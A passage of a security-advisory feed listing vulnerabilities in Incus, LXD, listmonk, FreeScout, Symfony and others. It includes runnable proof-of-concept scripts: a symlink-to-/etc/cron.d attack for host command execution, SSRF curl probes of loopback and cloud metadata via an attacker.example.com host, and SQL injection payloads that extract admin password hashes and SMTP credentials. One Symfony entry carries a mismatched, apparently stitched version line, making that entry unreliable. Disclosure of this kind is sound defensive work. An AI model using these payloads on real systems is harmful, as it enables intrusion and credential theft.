the `.stdout` file will contain arbitrary content. This behavior can be
abused for arbitrary command execution.


### Details

When an image is unpacked, top-level symlinks are extracted as is;
allowing for `exec-output` to be placed on disk. In `instance_exec.go`,
`os.Mkdir` continues of `exec-output` exists and `os.OpenFile` follows
the `exec-output` symlink.


### PoC

Below, we place the `exec_UUID.stdout` file in `/etc/cron.d` on
the host for arbitrary command execution.

```
#!/bin/sh
# usage: $0 existing-imagefp
set -eu

basefp="${1}"

die() {
        printf '%s' "${@}" >&2
        exit 1
}

command -v curl >/dev/null 2>&1 || die 'error: curl not found\n'
command -v python3 >/dev/null 2>&1 || die 'error: python3 not found\n'

tmpdir=$(mktemp -d)
cleanup() {
        rm -rf "${tmpdir}"
}
trap cleanup EXIT INT QUIT TERM HUP


# insert exec-output symlink

incus image export "${basefp}" "${tmpdir}/img"

mkdir "${tmpdir}/repack"
cd "${tmpdir}/repack"

xz -cd "${tmpdir}/img" | tar -f- -vx

rm -rf exec-output
ln -s /etc/cron.d exec-output

tar -f- -c * | gzip -c9 >"${tmpdir}/img"

cd - >/dev/null
incus image import "${tmpdir}"/img* --alias afw-exec-output


# Launch container, exec with record-output via REST API
incus launch afw-exec-output afw-exec-output
incus wait afw-exec-output ip

OP=$(curl -s --unix-socket /var/lib/incus/unix.socket \
  -X POST -H 'Content-Type: application/json' \
  -d '{"command":["/bin/sh","-c","echo * * * * * root id'"'>'"'/afw-exec-output"],"record-output":true}' \
  "lxd/1.0/instances/afw-exec-output/exec" | python3 -c "import sys,json;print(json.load(sys.stdin)['operation'])")

curl -s --unix-socket /var/lib/incus/unix.socket "$OP/wait?timeout=30" >/dev/null

#find /etc/cron.d/exec_* -exec cat {} \;
```

### Impact

Constrained file creation in an arbitrary directory on the host via
via an unsanitized symlink; possibly leading to command execution.

items.title: LXD: SSRF via image import from URL allows internal network probing by authenticated users
items.description:
## Summary
The LXD image import-from-URL endpoint (`POST /1.0/images` with `source.type=url`) makes server-side HTTP requests to an attacker-supplied URL without any private-IP or loopback blocking. An authenticated user with the `can_create_images` entitlement can force the LXD daemon to connect to internal network addresses (127.0.0.1, RFC1918 ranges, cloud metadata endpoints), enabling port scanning via error-based inference and interaction with internal HTTP services from the daemon's privileged network position.

## Severity

- **Attack Vector:** Network — LXD API is network-accessible.
- **Attack Complexity:** Low — Single crafted API request with no special conditions.
- **Privileges Required:** Low — Requires `can_create_images` entitlement, a non-admin permission commonly delegated to regular users.
- **User Interaction:** None.
- **Scope:** Changed — The attacker leverages LXD's privileged network position to probe and interact with internal services that are outside the attacker's direct network access and outside the scope of LXD's image management authorization.
- **Confidentiality Impact:** Low — Error messages reveal internal port states (open/closed/filtered) and service availability. Response bodies from internal services are NOT returned to the attacker (hash validation blocks content exfiltration).
- **Integrity Impact:** None — No demonstrated ability to modify data on internal services.
- **Availability Impact:** None — No meaningful resource exhaustion or denial of service.

## Affected Component
- `lxd/images.go` — `imgPostURLInfo` (lines 668–755) — Makes HEAD request to user-supplied URL without any SSRF protections.
- `lxd/util/http.go` — `HTTPClient` (lines 102–147) — Creates HTTP client with no IP blocking or URL validation.
- `shared/network.go` — `RFC3493Dialer` (lines 20–49) — Dials arbitrary hosts including private/loopback ranges.
- `lxd/daemon_images.go` — `ImageDownload` (lines 478–510, "direct" case) — Makes GET request to URL from attacker-controlled response header.

## Description

### Core vulnerability: no SSRF protections on server-side image fetching

When a user imports an image from a URL, the `imgPostURLInfo` function makes an HTTP HEAD request directly to the user-supplied URL with zero validation:

```go
// lxd/images.go:668-703
func imgPostURLInfo(ctx context.Context, s *state.State, req api.ImagesPost, ...) (*api.Image, error) {
    if req.Source.URL == "" {
        return nil, errors.New("Missing URL")
    }

    myhttp, err := util.HTTPClient("", s.Proxy)
    // ...

    // Resolve the image URL
    head, err := http.NewRequest("HEAD", req.Source.URL, nil)
    // No URL validation, no scheme check, no IP range check
    // ...

    raw, err := myhttp.Do(head)  // Makes request to arbitrary destination
```

The HTTP client is created via `util.HTTPClient` which uses `shared.RFC3493Dialer` — a standard dialer with zero private-IP filtering:

```go
// shared/network.go:20-49
func RFC3493Dialer(context context.Context, network string, address string) (net.Conn, error) {
    host, port, err := net.SplitHostPort(address)
    // ...
    addrs, err := net.LookupHost(host)
    // ...
    for _, a := range addrs {
        c, err := net.DialTimeout(network, net.JoinHostPort(a, port), 10*time.Second)
        // No check: IsLoopback? IsPrivate? IsLinkLocalUnicast?
        // Connects to ANY resolved address including 127.0.0.1, 10.x.x.x, 169.254.169.254
```

The HTTP client also follows redirects unconditionally:

```go
// lxd/util/http.go:139-144
myhttp.CheckRedirect = func(req *http.Request, via []*http.Request) error {
    // Replicate the headers
    req.Header = via[len(via)-1].Header
    return nil  // Always follows redirects — no destination validation
}
```

### No SSRF protections exist anywhere in the codebase

An exhaustive search for private-IP checks (`IsLoopback`, `IsPrivate`, `IsLinkLocalUnicast`), URL allowlists, or SSRF-specific protections found **zero results** in any HTTP client or outbound request path. The codebase has no SSRF defense infrastructure.

### Chained SSRF via `LXD-Image-URL` response header

After the HEAD request, the `LXD-Image-URL` response header is used as the target for a second HTTP GET request, creating a chained SSRF:

```go
// lxd/images.go:705-725
hash := raw.Header.Get("LXD-Image-Hash")  // Attacker controls this
url := raw.Header.Get("LXD-Image-URL")    // Attacker controls this

info, err := ImageDownload(ctx, s, op, &ImageDownloadArgs{
    Server:   url,       // Attacker-controlled URL from response header
    Protocol: "direct",  // Forces unprotected direct HTTP GET
    Alias:    hash,      // Attacker-controlled hash
    // ...
})
```

In `ImageDownload`, the "direct" case makes a GET to the attacker-controlled URL:

```go
// lxd/daemon_images.go:478-510
case "direct":
    httpClient, err := util.HTTPClient(args.Certificate, s.Proxy)
    // ...
    req, err := http.NewRequest(http.MethodGet, args.Server, nil)  // args.Server = attacker URL
    // ...
    raw, doneCh, err := cancel.CancelableDownload(canceler, httpClient.Do, req)
```

This means an attacker who controls the HEAD target can redirect the second GET request to any internal service. The response body is downloaded to disk but hash validation prevents the attacker from reading it:

```go
// lxd/daemon_images.go:541-544
result := hex.EncodeToString(sha256.Sum(nil))
if result != fp {
    return nil, fmt.Errorf("Hash mismatch for %q: %s != %s", args.Server, result, fp)
}
```

### Error observability enables port scanning

Errors from the outbound request propagate back to the caller via the operation result:

```go
// lxd/operations/operations.go:612-614
if op.err != nil {
    retOp.Err = response.SmartError(op.err).String()
}
```

The error messages differ based on the target's state:
- **Port open**: `"Missing LXD-Image-Hash header"` (HEAD succeeded, response had no expected headers)
- **Port closed**: `"connection refused"` (connection rejected immediately)
- **Port filtered/host unreachable**: `"context deadline exceeded"` / `"no route to host"` (timeout or routing error)

These differences allow systematic port scanning of internal networks from the LXD daemon's network position.

### Execution chain

1. Attacker sends `POST /1.0/images` with `{"source":{"type":"url","url":"http://127.0.0.1:6379/"}}`
2. `imagesPost` handler verifies `can_create_images` entitlement (line 1163)
3. Background operation calls `imgPostURLInfo` (line 1361)
4. `imgPostURLInfo` creates HTTP client via `util.HTTPClient` — no SSRF protections (line 675)
5. HEAD request to `http://127.0.0.1:6379/` — no IP validation (line 700)
6. `RFC3493Dialer` resolves `127.0.0.1` and dials it — no private-IP check (line 33)
7. Error or response propagated back via operation (line 612-614 in operations.go)
8. Attacker queries operation result via `GET /1.0/operations/{id}/wait` and reads the error message

For chained SSRF:
1. Attacker points `source.url` to their own server
2. Their server responds with `LXD-Image-Hash: <any>` and `LXD-Image-URL: http://169.254.169.254/latest/meta-data/`
3. LXD makes GET to `http://169.254.169.254/...` (line 493 in daemon_images.go)
4. Response body downloaded but hash validation prevents content exfiltration
5. Error messages still reveal whether the internal service responded (200 vs error)

## Proof of Concept

```bash
# Safe PoC: force daemon to connect to loopback port 1 (closed port).
# Error message will confirm server-side request occurred.
SOCK=/var/lib/lxd/unix.socket

# Create the operation
OP=$(curl -s --unix-socket "$SOCK" \
  -H 'Content-Type: application/json' \
  -X POST http://localhost/1.0/images \
  -d '{"source":{"type":"url","url":"http://127.0.0.1:1/"}}' \
  | sed -n 's/.*"operation":"\([^"]*\)".*/\1/p')

# Wait for result — expect "connection refused" confirming SSRF
curl -s --unix-socket "$SOCK" "http://localhost${OP}/wait"
# Response will contain error with "connection refused" — confirms
# the daemon made a server-side connection to 127.0.0.1:1

# Port scanning: compare errors for open vs closed ports
# Open port (e.g., LXD's own API on 8443):
curl -s --unix-socket "$SOCK" \
  -H 'Content-Type: application/json' \
  -X POST http://localhost/1.0/images \
  -d '{"source":{"type":"url","url":"https://127.0.0.1:8443/"}}'
# Expect: "Missing LXD-Image-Hash header" (connection succeeded, got HTTP response)

# Closed port:
curl -s --unix-socket "$SOCK" \
  -H 'Content-Type: application/json' \
  -X POST http://localhost/1.0/images \
  -d '{"source":{"type":"url","url":"http://127.0.0.1:9999/"}}'
# Expect: "connection refused" (port not open)

# Cloud metadata probe (chained SSRF):
# Step 1: Set up attacker server that responds to HEAD with:
#   LXD-Image-Hash: deadbeef
#   LXD-Image-URL: http://169.254.169.254/latest/meta-data/
# Step 2: Point LXD at attacker server:
curl -s --unix-socket "$SOCK" \
  -H 'Content-Type: application/json' \
  -X POST http://localhost/1.0/images \
  -d '{"source":{"type":"url","url":"http://attacker.example.com/ssrf"}}'
# LXD will make GET to http://169.254.169.254/latest/meta-data/
```

## Impact

- **Internal network port scanning**: Authenticated users can systematically probe internal networks reachable from the LXD host, identifying open services via error-based inference.
- **Cloud metadata access**: In cloud deployments (AWS, GCP, Azure), the daemon can be directed to connect to metadata endpoints (169.254.169.254), potentially triggering metadata interactions from the host's privileged network context.
- **Internal service interaction**: The daemon makes real HTTP HEAD and GET requests to internal services, which could trigger side effects on services that process GET/HEAD requests.
- **Network topology disclosure**: Error messages and timing differences reveal internal network structure, reachable hosts, and open ports.
- **Chained SSRF amplification**: The `LXD-Image-URL` response header enables attackers to redirect the daemon's second HTTP GET request to any internal destination, doubling the attack surface.

## Recommended Remediation

### Option 1: Private-IP blocking in `RFC3493Dialer` (preferred — defense at lowest layer)

Add IP range validation in the shared dialer so ALL outbound HTTP requests from LXD are protected:

```go
// shared/network.go
import "net/netip"

// isBlockedAddress returns true if the address is in a private, loopback,
// or link-local range that should not be reachable via user-supplied URLs.
func isBlockedAddress(ip string) bool {
    addr, err := netip.ParseAddr(ip)
    if err != nil {
        return true // Block unparseable addresses
    }
    return addr.IsLoopback() || addr.IsPrivate() || addr.IsLinkLocalUnicast() || addr.IsLinkLocalMulticast()
}

// RFC3493DialerNoSSRF is a variant of RFC3493Dialer that blocks connections
// to private/loopback/link-local addresses.
func RFC3493DialerNoSSRF(context context.Context, network string, address string) (net.Conn, error) {
    host, port, err := net.SplitHostPort(address)
    if err != nil {
        return nil, err
    }

    addrs, err := net.LookupHost(host)
    if err != nil {
        return nil, err
    }

    var errs []error
    for _, a := range addrs {
        if isBlockedAddress(a) {
            errs = append(errs, fmt.Errorf("connection to private/loopback address %s is not allowed", a))
            continue
        }
        c, err := net.DialTimeout(network, net.JoinHostPort(a, port), 10*time.Second)
        if err != nil {
            errs = append(errs, err)
            continue
        }
        tc, ok := c.(*net.TCPConn)
        if ok {
            _ = tc.SetKeepAlive(true)
            _ = tc.SetKeepAlivePeriod(3 * time.Second)
        }
        return c, nil
    }

    return nil, fmt.Errorf("%s: %s (%v)", connectErrorPrefix, address, errs)
}
```

Then use `RFC3493DialerNoSSRF` in `util.HTTPClient` when the caller is handling user-supplied URLs.

### Option 2: URL validation in `imgPostURLInfo` (complementary)

Add scheme and destination validation at the handler level as defense-in-depth:

```go
// lxd/images.go — in imgPostURLInfo, before the HEAD request
parsed, err := url.Parse(req.Source.URL)
if err != nil {
    return nil, fmt.Errorf("Invalid URL: %w", err)
}

if parsed.Scheme != "http" && parsed.Scheme != "https" {
    return nil, fmt.Errorf("Unsupported URL scheme %q: only http and https are allowed", parsed.Scheme)
}

// Also validate the LXD-Image-URL from the response header before passing to ImageDownload
url := raw.Header.Get("LXD-Image-URL")
if url != "" {
    parsedRedirect, err := url.Parse(url)
    // Apply same scheme and IP validation
}
```

Both options should be applied together. Option 1 protects all HTTP clients at the network layer (including the chained SSRF). Option 2 provides clear error messages and catches issues before a connection is attempted.

## Credit
This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## Mitigation and additional fixes

In addition to the Image Registries feature in LXD 6.10 to resolve the main issue above we are also introducing a related change in LXD 6.8 to prevent the use of `pull` migration mode when migrating instances and volumes into restricted projects. In these circumstances one should use `push` or `relay` mode. 

The documentation has also been updated to cover setting up an HTTP/HTTPS proxy in order to allow policy to be applied to control which remote image URLs can be used.

https://canonical.com/lxd/docs/latest/howto/security_harden/#restrict-outbound-requests

items.title: Skyline DataMiner BrokerGateway contains an embedded API key vulnerability that allows unauthenticated attackers to ret…
items.description: Skyline DataMiner BrokerGateway contains an embedded API key vulnerability that allows unauthenticated attackers to retrieve the installation-specific BrokerGateway key even while pairing mode is disabled. items.title: FreeScout is a self-hosted help desk and shared mailbox.
items.description: FreeScout is a self-hosted help desk and shared mailbox. Prior to 1.8.230, a pre-authenticated attacker can place HTML in a failed-login email value that is copied through monitored user activity into a queued SendAlert job. If alert delivery fails, the serialized payload is stored in failed_jobs and the administrator job-details endpoint renders it after a blacklist sanitizer that leaves executable event-handler attributes. When an administrator opens /system/ajax-html/job_details/{id} as a top-level page, the raw fragment lacks the normal layout policy and attacker-controlled JavaScript can perform same-origin administrator actions. Logs Monitoring for users, a failed alert email job, queue failure storage, and top-level administrator interaction are all required; the normal modal path is not affected in the tested configuration. This issue is fixed in version 1.8.230.

items.title: Gradle Shadow: Zip Slip path traversal in ShadowCopyAction — no independent entry-name sanitization
items.description: The Gradle Shadow plugin creates fat or uber JARs and supports file transformation and package relocation. Prior to version 9.6.0, Shadow does not independently validate ZIP entry names before writing them to its output archive. A malicious dependency can cause traversal entry names to be preserved when the applicable archive-processing path does not reject them. Some affected Shadow implementations process dependency archives directly, so upgrading Gradle alone does not universally prevent this behavior. If the resulting archive is extracted without path traversal protection, attacker-controlled files can be written outside the intended destination. This issue is fixed in version 9.6.0.

items.title: Wanderer is a self-hosted trail database for saving and sharing adventures.
items.description: Wanderer is a self-hosted trail database for saving and sharing adventures. Prior to 0.19.3, the unauthenticated GET /activitypub/trail/{id} and GET /activitypub/comment/{id} endpoints call ActivitypubTrail() and ActivitypubComment() to return full trail and comment records without applying the PocketBase collection view rules. An attacker who can enumerate or guess record IDs can retrieve private trail names, descriptions, GPS coordinates, GPX file URLs, photo URLs, and comments. This issue is fixed in version 0.19.3.

items.title: EDFbrowser before 2.16 contains an out-of-bounds write vulnerability in check_edf_file() that allows attackers to overf…
items.description: EDFbrowser before 2.16 contains an out-of-bounds write vulnerability in check_edf_file() that allows attackers to overflow the 256-element annot_ch array by supplying excessive annotation signals. Attackers can craft an EDF+ or BDF+ file with more than 256 annotation signals to overwrite edfhdrblock members, including the signal parameter pointer, crashing the application when opened.

items.title: SharePoint Products CopyMove before 2026-11-06 allows traversal.
items.description: SharePoint Products CopyMove before 2026-11-06 allows traversal. An authenticated SharePoint user with the necessary permissions to use the ZIP import functionality may exploit a path traversal vulnerability in CopyMove for SharePoint 2019 and CopyMove for SharePoint V6 by supplying a crafted ZIP archive. A path traversal vulnerability in the ZIP import functionality of SharePoint Products ApS CopyMove for SharePoint 2019 and CopyMove for SharePoint V6 allows a user with access to the ZIP import functionality to supply a crafted ZIP archive containing malicious entry paths. During extraction, these paths may cause files to be written outside the intended extraction directory. The issue has been addressed by implementing ZIP archive entry path validation to prevent extraction outside the designated directory.

items.title: A flaw was found in the default seccomp profile used by Podman via containers-common.
items.description: A flaw was found in the default seccomp profile used by Podman via containers-common. Deny rules for AF_VSOCK and NETLINK_AUDIT compared socket arguments with unmasked 64-bit equality. Because the kernel truncates those int arguments to 32 bits, setting upper bits can bypass the deny rules.

items.title: The Symfony Config component XmlUtils::parse() enables DTD validation before rejecting documents that carry a doctype,…
items.description:
The Symfony Config component XmlUtils::parse() enables DTD validation before rejecting documents that carry a doctype, allowing XML external entity (XXE) injection in Symfony versions prior to 5.4.56, 6.x prior to 6.4.50, 7.x prior to 7.4.23, and 8.x prior to 8.1.11. A remote attacker who can supply XML to this method can determine whether local files exist, cause a denial of service, and, in some configurations, exfiltrate local file content via a crafted XML document whose doctype declares an external file:// entity.
XmlUtils::parse() sets $dom->validateOnParse = true before calling loadXML() and only rejects documents carrying a doctype afterwards. Enabling DTD validation makes libxml resolve external entities during loadXML(), and LIBXML_NONET blocks http:// but not file://, so a file:// entity is read from disk before the doctype rejection runs. The content of the file is not returned to the caller, but the distinct libxml error for a missing path reveals whether a file exists, and an entity pointing at a large or slow file causes a denial of service. If the application registers a network-capable stream wrapper such as s3://, a parameter entity can also send the content of a local file to an external server. This is the same issue as CVE-2026-45071, which was fixed in the DomCrawler component but not in Config.

Applications are affected if they pass untrusted XML to XmlUtils::parse() directly. The Symfony components that call it process developer-provided or operator-configured sources, such as configuration files and the XLIFF documents fetched by the translation providers.

The manipulation results in resource consumption. The attack may be launched remotely. Upgrading to version 3.1.7 addresses this issue. items.title: ERPNext OCR app for Frappe/ERPNext through 1.1.1 contains a missing authorization and path traversal vulnerability that…
items.description: ERPNext OCR app for Frappe/ERPNext through 1.1.1 contains a missing authorization and path traversal vulnerability that allows any authenticated user to read arbitrary server files by passing a fully client-controlled path argument to the whitelisted read_document method. Attackers can supply local file paths to bypass Frappe's File doctype permission model and access other users' private uploads, or supply arbitrary URLs to trigger server-side requests reaching internal services and cloud metadata endpoints.

items.title: OHIF Viewers: DOM-Based Cross Site Scripting (XSS) through MIME type of document
items.description: OHIF Viewers is a zero-footprint DICOM viewer with shared extension packages. From 3.5.0-beta.0 until 3.12.15, 3.13.7, and 3.14.0-beta.19, the dicom-pdf extension reads the attacker-controlled MIMETypeOfEncapsulatedDocument value in extensions/dicom-pdf/src/getSopClassHandlerModule.js and uses it as the Blob media type for the attacker-controlled EncapsulatedDocument bytes. When a victim opens Encapsulated PDF SOP Class 1.2.840.10008.5.1.4.1.1.104.1, extensions/dicom-pdf/src/viewports/OHIFCornerstonePdfViewport.tsx embeds the Blob URL in an object element. A Blob labeled as HTML is handled as HTML despite the application/pdf object hint, and the Blob inherits the OHIF origin, allowing embedded script to access session storage, authentication tokens, and same-origin PACS requests. The malicious DICOM object may be opened locally, uploaded to a shared PACS, or supplied by a DICOMweb source. This issue is fixed in source versions 3.12.15, 3.13.7, and 3.14.0-beta.19.

items.title: Kroki creates diagrams from textual descriptions.
items.description: Kroki creates diagrams from textual descriptions. Prior to 0.31.2, the TikZ backend's tikz/tikz2svg guard used when KROKI_SAFE_MODE is enabled blocks only \verbatiminput while allowing native TeX file-read primitives including \openin, \read, \input, and \include. TeX Live's permissive openin_any setting remains active, so an unauthenticated actor can submit crafted LaTeX to POST /tikz/svg or the generic diagram API and cause the renderer to read any file accessible to the Kroki container user. The file contents are rendered into the returned SVG, which may disclose mounted secrets, configuration data, credentials, private keys, or process environment data. The -no-shell-escape option prevents shell execution but does not restrict these native file operations. This issue is fixed in version 0.31.2.

items.title: Nuxt Content: Unauthenticated SQLite Function DoS via Content Query API
items.description: Nuxt Content is the file-based CMS for Nuxt applications, powered by Markdown and Vue components. From 3.0.0 until 3.15.2, the unauthenticated POST /__nuxt_content/:collection/query endpoint accepts an attacker-controlled sql field in src/runtime/api/query.post.ts and permits expensive SQLite expressions. Version 3.0.0 performed no query validation; in affected releases using assertSafeQuery in src/runtime/internal/security.ts, the reported validation gap rejects a short list of SQL command keywords in WHERE clauses but permits function calls including randomblob(), zeroblob(), hex(), and length(). The query reaches the synchronous better-sqlite3 sink in src/runtime/internal/database.server.ts, allowing a single remote request to consume substantial CPU and memory while blocking the Node.js event loop and all concurrent request handling. Fully static prerendered deployments that do not expose the server endpoint are not affected. This issue is fixed in version 3.15.2.

items.title: Kroki creates diagrams from textual descriptions.
items.description: Kroki creates diagrams from textual descriptions. From 0.26.0 until 0.31.2, the optional Mermaid companion's mermaid/src/worker.js renders attacker-controlled flowchart image nodes in headless Chromium without a network request policy, even when KROKI_SAFE_MODE is set to secure. An actor who can submit Mermaid source and satisfy any authentication or authorization configured by the deployment can cause the companion to issue HTTP or HTTPS GET requests when requesting PNG output. Exploitation requires the Mermaid companion, PNG rendering through its headless Chromium process, a diagram-submission path available to the actor, and network reachability from the companion to the target. The demonstrated impact is limited to blind request reachability and possible state-changing GET endpoints; response exfiltration, cloud metadata access, port scanning, and access beyond the companion's network reachability are not established. This issue is fixed in version 0.31.2.

items.title: listmonk: SQL Injection in `/api/subscribers/export` bypasses table access control, leaking admin password hashes and SMTP credentials
items.description:
### Summary

A SQL injection vulnerability in `GET /api/subscribers/export` allows an authenticated user with the `subscribers:sql_query` permission to bypass the table access control that exists on the regular query endpoint (`GET /api/subscribers`) and read arbitrary tables from the database — including `users` (bcrypt password hashes) and `settings` (SMTP credentials, API keys). Both error-based and time-based exfiltration techniques are confirmed to work. This creates a privilege escalation path: `subscribers:sql_query` → hash exfiltration → offline bcrypt crack (cost factor 6) → Super Admin account takeover.

---

### Details

The subscriber query feature accepts a user-controlled `query` parameter that is injected directly into a SQL template via `strings.ReplaceAll`. The regular query endpoint `GET /api/subscribers` correctly calls `validateQueryTables` to block access to sensitive tables before execution. The export endpoint `GET /api/subscribers/export` **omits this call entirely**, creating an asymmetric bypass of an intentional security control.

**`internal/core/subscribers.go` — protected path (regular query):**

```go
// QuerySubscribers — table validation present
stmt := strings.ReplaceAll(c.q.QuerySubscribersTpl, "%query%", cond)
if err := validateQueryTables(c.db, stmt, allowedSubQueryTables); err != nil {
    return nil, 0, echo.NewHTTPError(http.StatusBadRequest,
        fmt.Sprintf("Error preparing subscriber query: %v", err))
}
```

**`internal/core/subscribers.go` — vulnerable path (export):**

```go
// ExportSubscribers — NO table validation
stmt := strings.ReplaceAll(c.q.QuerySubscribersForExport, "%query%", cond)
tx, err := c.db.Preparex(stmt)  // executes directly without restriction
```

**`queries/subscribers.sql` — the `%query%` placeholder is injected into a WHERE clause:**

```sql
SELECT subscribers.id, subscribers.email, ...
FROM subscribers
LEFT JOIN subscriber_lists ON ...
WHERE (subscribers.status != 'blocklisted') AND %query%
ORDER BY subscribers.id ASC LIMIT ...
```

Because the export path does not run inside a `ReadOnly` transaction (unlike the dry-run used in `QuerySubscribers`), PostgreSQL CTEs with data-modifying statements (`WITH ... UPDATE ... RETURNING`) are also executable, enabling write operations beyond read-only exfiltration.

---

### PoC

**Prerequisites:** Authenticated session with `subscribers:sql_query` and `subscribers:get_all` permissions.

**Step 1 — Confirm the bypass (blocked on query, open on export):**

```bash
# Blocked on regular endpoint:
curl -s "http://TARGET:9000/api/subscribers?query=(SELECT+1+FROM+users+LIMIT+1)+IS+NOT+NULL" \
  -H "Cookie: session=SESSION_TOKEN"
# → HTTP 400: {"message":"Error preparing subscriber query: table 'users' is not allowed"}

# Bypassed on export endpoint:
curl -s "http://TARGET:9000/api/subscribers/export?query=(SELECT+1+FROM+users+LIMIT+1)+IS+NOT+NULL" \
  -H "Cookie: session=SESSION_TOKEN"
# → HTTP 200: returns subscriber rows with no error
```

**Step 2 — Error-based exfiltration of admin password hash:**

```bash
curl -s "http://TARGET:9000/api/subscribers/export?\
query=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+integer)+>+0" \
  -H "Cookie: session=SESSION_TOKEN"
```

Response:
```json
{
  "message": "Error fetching Subscribers: pq: invalid input syntax for type integer: \"$2a$06$vI8n66eJwWCQDms5d47up.TmBYUsxRF13sw8efTh8TCyMQVLX2cn.\""
}
```

**Step 3 — Error-based exfiltration of SMTP credentials:**

```bash
curl -s "http://TARGET:9000/api/subscribers/export?\
query=CAST((SELECT+value::text+FROM+settings+WHERE+key='smtp'+LIMIT+1)+AS+integer)+>+0" \
  -H "Cookie: session=SESSION_TOKEN"
```

Response:
```json
{
  "message": "Error fetching Subscribers: pq: invalid input syntax for type integer: \"[{\"host\": \"smtp.yoursite.com\", \"port\": 25, \"enabled\": true, \"password\": \"...\", \"username\": \"...\"}]\""
}
```

**Step 4 — Time-based blind confirmation:**

```bash
time curl -s "http://TARGET:9000/api/subscribers/export?query=pg_sleep(3)+IS+NOT+NULL" \
  -H "Cookie: session=SESSION_TOKEN"
# Returns after ~3 seconds — confirms arbitrary SQL function execution
```

---

### Impact

This is a SQL injection vulnerability that bypasses an intentional security control. Any user with the `subscribers:sql_query` permission can:

- Read bcrypt password hashes of all admin accounts (including Super Admin)
- Extract SMTP credentials, API keys, and all values stored in the `settings` table
- Chain with offline bcrypt cracking (cost factor 6, fast to crack) for full account takeover
- Execute data-modifying SQL via PostgreSQL CTEs (write impact)

**Attack chain:** `subscribers:sql_query` → SQLi on export → bcrypt hash exfiltration → offline crack → Super Admin takeover → full instance compromise.

This finding is **distinct** from the accepted risk in listmonk's security policy ("SQL injection via subscriber query is a known limitation"). The regular query endpoint correctly applies `validateQueryTables` to prevent access to sensitive tables. The export endpoint is missing that same guard — this is an implementation gap in a deliberate security control, not an accepted design limitation.

items.title: OSAC operator: Kubeconfig credential-plugin execution and SSRF in console proxy
items.description:
### Impact

 The console-proxy's RemoteConfigResolver parses kubeconfig data from Kubernetes Secrets using clientcmd.RESTConfigFromKubeConfig without sanitizing the resulting rest.Config. A kubeconfig containing an exec
  plugin stanza (under users[].user.exec) is faithfully preserved. When rest.TransportFor later builds the HTTP transport for the upstream WebSocket connection, client-go invokes the exec plugin — spawning an
  arbitrary process as the osac-console-proxy service account.

  This allows remote code execution inside the console-proxy pod for any principal that can create or modify a Secret with the label osac.openshift.io/remote-cluster-kubeconfig: "true" in a namespace where the
  console-proxy has Secret read access (governed by its RoleBinding). A secondary vector exists via attacker-controlled clusters[].server, enabling server-side request forgery (SSRF) from within the proxy pod.

  Affected configurations: any deployment using remote or auto VM cluster mode (the default). Deployments using local mode exclusively are not affected, as they do not read kubeconfig Secrets.

### Patches


  The fix is two lines in internal/consoleproxy/config_resolver.go, applied immediately after clientcmd.RESTConfigFromKubeConfig returns:

  config.ExecProvider = nil
  config.AuthProvider = nil

  This is patched in `0.0.4`. Users should upgrade to the first release containing this patch once available.

### Workarounds

  - Restrict Secret creation in the namespace where the osac-console-proxy-secret-reader RoleBinding is deployed. Ensure only trusted principals (cluster admins, operator service accounts) can create or modify
  Secrets there.
  - Switch to local VM cluster mode (--vm-cluster-mode=local) if the KubeVirt VMs run on the same cluster as the proxy. This bypasses the Secret-based kubeconfig lookup entirely.
  - Use an admission webhook or OPA policy to reject Secrets containing exec: or auth-provider: stanzas in the kubeconfig data within the affected namespace.

items.title: Eclipse hawkBit DDI has Privilege Escalation that allows Tenant-Isolated Firmware Exfiltration
items.description:
## **Description**
A privilege escalation vulnerability has been identified in the Direct Device Integration (DDI) Controller of **Eclipse hawkBit** (versions 1.0.3 and prior).

This vulnerability allows an authenticated device to escalate its permissions and bypass the strict boundaries of its assigned updates. Under normal operation, a device should be restricted **strictly to the specific firmware artifacts explicitly assigned to it**. However, this flaw enables any authenticated device to bypass this restriction and download any firmware artifact **within the same tenant**.

This is **not** an authentication bypass; the requesting device must possess valid credentials for its respective tenant. Instead, the issue stems from a flaw in object-level authorization validation.

A related, lower-severity helper issue exists in the listing software modules artifacts metadata endpoint. This endpoint does not enforce assignment checks, enabling an authenticated device to list and enumerate available firmware artifacts, which can facilitate targeted exfiltration using the main download authorization bypass.

---

## **Impact**
* **Severity:** Moderate
* **Scope:** Tenant-isolated. An attacker must be an authenticated device within the target tenant to exploit this vulnerability.
* **Confidentiality Impact:** **Low**. While firmware binaries can be retrieved, the impact is mitigated because access is restricted strictly to the scope of the pre-authenticated tenant, and no administrative or cross-tenant data is exposed. Additionally, production firmware binaries are by design not expected to contain highly sensitive or confidential data (such as hardcoded credentials or private keys), further supporting the Low confidentiality rating.

---

## **Affected Products and Versions**
* **Product:** `eclipse-hawkbit/hawkbit`
* **Affected Component:** `hawkbit-ddi/hawkbit-ddi-resource`, as well as the compiled binaries and Docker images that contain this component.
* **Affected Versions:** `1.0.3` and prior versions.
* **Patched Version:** `1.0.4`

---

## **Remediation**
Upgrade to version **1.0.4** or later. 

**Fix details:** The download authorization logic has been corrected to ensure that assignment-based verification is executed on every artifact download request. Additionally, the software module metadata endpoint has been updated to enforce proper authorization, restricting access exclusively to software modules and artifacts that are explicitly assigned to or already installed on the requesting device.

---

## **Credits**
Eclipse would like to thank **Santosh Kumar Puppala** (GitHub: [Santoshkumarpuppala](https://github.com/Santoshkumarpuppala), Email: santhoshkumar7794@gmail.com) for discovering and reporting this vulnerability through coordinated disclosure.

items.title: FreeScout is a self-hosted help desk and shared mailbox.
items.description: FreeScout is a self-hosted help desk and shared mailbox. Prior to 1.8.230, multiple outbound paths in Helper::downloadRemoteFile(), Helper::checkPort(), Helper::sanitizeRemoteUrl(), MailboxesController.php, and ModulesController.php do not consistently enforce a sink-level restricted-host policy. An authenticated administrator, or another authenticated user permitted to change mailbox connection settings or trigger module update or installation paths, can supply attacker-controlled URLs or hosts. The independent download and port-test sinks can reach encoded or otherwise uncovered loopback and internal addresses. The redirect-validation bypass additionally requires a configured whitelist that permits the original and final hosts while a restricted internal host appears only as an intermediate redirect hop. No unauthenticated SSRF path is established. The server can consequently contact loopback and internal services, provide a blind internal port oracle, and retrieve internal HTTP responses into application-controlled download sinks. This issue is fixed in version 1.8.230.

items.title: FreeScout is a self-hosted help desk and shared mailbox.
items.description: FreeScout is a self-hosted help desk and shared mailbox. Prior to 1.8.227, the conversation_merge action records a failed authorization check for the target conversation in response['msg'] and then clears that value inside the source-conversation loop. An authenticated agent can merge a conversation they control into a target conversation in a mailbox they cannot access. The operation injects threads, attachments, and audit records into the unauthorized target and deletes the source conversation, but it does not disclose the target's existing contents. This issue is fixed in version 1.8.227.

